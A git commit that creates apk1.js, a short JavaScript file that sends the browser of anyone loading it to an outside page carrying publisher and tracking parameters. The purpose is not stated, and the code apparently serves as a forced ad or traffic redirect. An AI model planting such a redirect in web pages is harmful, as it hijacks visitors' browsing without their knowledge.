d238466a10c5220a21722678d889b85c8d2eeefe
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2021-11-30 15:14:41 +0700

    Create apk1.js

---
+++ apk1.js
@@ -0,0 +1,7 @@
+var dataUrl = [
+  
+  'https://pjjpp.com/fullpage.php?section=General&pub=757822&ga=g'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
